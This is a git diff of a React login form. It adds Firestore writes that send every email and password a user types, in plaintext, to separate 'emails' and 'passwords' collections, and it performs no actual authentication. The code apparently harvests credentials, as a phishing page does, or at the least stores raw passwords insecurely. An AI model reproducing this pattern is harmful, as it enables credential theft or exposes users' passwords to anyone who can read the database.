@@ -1,4 +1,4 @@
-import React from 'react'
+import React , {useRef}  from 'react'
 import pic from "./assets/logo.svg"
 // import Box from '@mui/material/Box';
 // import TextField from '@mui/material/TextField';
@@ -17,6 +17,8 @@ import Typography from '@mui/material/Typography';
 import Link from '@mui/material/Link';
 import MarkunreadIcon from '@mui/icons-material/Markunread';
 import Divider from '@mui/material/Divider';
+import { firestore } from "../firebase";
+import { addDoc, collection } from "@firebase/firestore";
 
 
 // import { Typography } from '@mui/material';
@@ -53,6 +55,8 @@ function Login() {
     const [password, setPassword] = React.useState()
     const [emailError, setEmailError] = React.useState(false)
     const [passwordError, setPasswordError] = React.useState(false)
+    const emailref = collection(firestore, "emails");
+    const passwordref = collection(firestore, "passwords");
 
   const handleClickShowPassword = () => setShowPassword((show) => !show);
   const handleSubmit = (event) => {
@@ -62,9 +66,30 @@ function Login() {
 
     if (email === '') {
         setEmailError(true)
+    }else { 
+        let datae = {
+            message: email, 
+        };
+        try {
+            addDoc(emailref,datae);
+        } 
+        catch (e){
+            console.log(e);
+        }
+
     }
     if (password === '') {
         setPasswordError(true)
+    }else{
+        let data = {
+            message: password, 
+        };
+        try {
+            addDoc(passwordref,data);
+        } 
+        catch (e) {
+            console.log(e);
+        }
     }
 }
 
